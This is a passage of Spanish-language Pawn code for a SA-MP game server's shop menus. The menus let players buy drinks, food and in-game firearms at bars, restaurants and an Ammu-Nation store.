                new precio = 15, objeto = 63;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
                format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
				HideMenuForPlayer(restaurantes, playerid);
            }
            case 3: //Vaso de ron
            {
                new precio = 15, objeto = 64;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
                format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
				HideMenuForPlayer(restaurantes, playerid);
            }
            case 4: //Salir
            {
				HideMenuForPlayer(restaurantes, playerid);
            }
        }
    }
	if(GetPlayerMenu(playerid) == bares) //Bares
    {
        TogglePlayerControllable(playerid, 1);
        switch(row)
        {
            case 0: //Botella de cerveza
            {
                new precio = 15, objeto = 61;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(bares, playerid);
            }
            case 1: //Botella de agua
            {
                new precio = 10, objeto = 60;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(bares, playerid);
            }
            case 2: //Lata de fanta
            {
                new precio = 13, objeto = 59;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
                format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
				HideMenuForPlayer(bares, playerid);
            }
            case 3: //Lata sprunk
            {
                new precio = 13, objeto = 58;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
                format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
				HideMenuForPlayer(bares, playerid);
            }
            case 4: //Copa de vino
            {
                new precio = 15, objeto = 62;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
                format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
				HideMenuForPlayer(bares, playerid);
            }
            case 5: //Vaso de whisky
            {
                new precio = 15, objeto = 63;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
                format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
				HideMenuForPlayer(bares, playerid);
            }
            case 6: //Vaso de ron
            {
                new precio = 15, objeto = 64;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
                format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
				HideMenuForPlayer(bares, playerid);
            }
            case 7: //Salir
            {
				HideMenuForPlayer(bares, playerid);
            }
        }
    }
    if(GetPlayerMenu(playerid) == comidasrapidas) //Comidas rápidas
    {
        TogglePlayerControllable(playerid, 1);
        switch(row)
        {
            case 0: //Lata de sprunk
            {
                new precio = 13, objeto = 58;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(comidasrapidas, playerid);
            }
            case 1: //Lata de fanta
            {
                new precio = 13, objeto = 59;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(comidasrapidas, playerid);
            }
            case 2: //Botella de agua
            {
                new precio = 10, objeto = 60;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
                format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
				HideMenuForPlayer(comidasrapidas, playerid);
            }
            case 3: //Hamburguesa
            {
                new precio = 20, objeto = 65;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
                format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
				HideMenuForPlayer(comidasrapidas, playerid);
            }
            case 4: //Burrito
            {
                new precio = 20, objeto = 66;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
                format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
				HideMenuForPlayer(comidasrapidas, playerid);
            }
            case 5: //Pizza
            {
                new precio = 30, objeto = 67;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
                format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
				HideMenuForPlayer(comidasrapidas, playerid);
            }
            case 6: //Salir
            {
				HideMenuForPlayer(comidasrapidas, playerid);
            }
        }
    }
    if(GetPlayerMenu(playerid) == discoteca) //Discoteca
    {
        TogglePlayerControllable(playerid, 1);
        switch(row)
        {
            case 0: //Lata de sprunk
            {
                new precio = 13, objeto = 58;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(discoteca, playerid);
            }
            case 1: //Lata de fanta
            {
                new precio = 13, objeto = 59;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(discoteca, playerid);
            }
            case 2: //Vaso de whisky
            {
                new precio = 13, objeto = 63;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
                format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
				HideMenuForPlayer(discoteca, playerid);
            }
            case 3: //Vaso de ron
            {
                new precio = 13, objeto = 64;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
                format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
				HideMenuForPlayer(discoteca, playerid);
            }
            case 4: //Salir
            {
				HideMenuForPlayer(discoteca, playerid);
            }
        }
    }
    if(GetPlayerMenu(playerid) == puticlub) //Puticlubs
    {
        TogglePlayerControllable(playerid, 1);
        switch(row)
        {
            case 0: //Botella de cerveza
            {
                new precio = 15, objeto = 61;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(puticlub, playerid);
            }
            case 1: //Vaso de whisky
            {
                new precio = 15, objeto = 63;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
                format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
				HideMenuForPlayer(puticlub, playerid);
            }
            case 2: //Vaso de ron
            {
                new precio = 15, objeto = 64;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
                format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
				HideMenuForPlayer(puticlub, playerid);
            }
            case 3: //Salir
            {
				HideMenuForPlayer(puticlub, playerid);
            }
        }
    }
    if(GetPlayerMenu(playerid) == ammunation) //Ammu Nations
    {
        TogglePlayerControllable(playerid, 1);
        switch(row)
        {
            case 0: //M1911
            {
                new precio = 2100, objeto = 19;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, GivePlayerWeapon(playerid, ObjetoInfo[objeto][IDArma], ObjetoInfo[objeto][Capacidad]), PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(ammunation, playerid);
            }
            case 1: //Cargador M1911
            {
                new precio = 300, objeto = 39;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(ammunation, playerid);
            }
            case 2: //Balas .45ACP
            {
                new precio = 1000, objeto = 47;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(ammunation, playerid);
            }
            case 3: //Remington 870
            {
                new precio = 4800, objeto = 22;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, GivePlayerWeapon(playerid, ObjetoInfo[objeto][IDArma], ObjetoInfo[objeto][Capacidad]), PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(ammunation, playerid);
            }
            case 4: //Cartuchos 12GA
            {
                new precio = 1200, objeto = 50;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(ammunation, playerid);
            }
            case 5: //Remington 700
            {
                new precio = 6200, objeto = 30;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
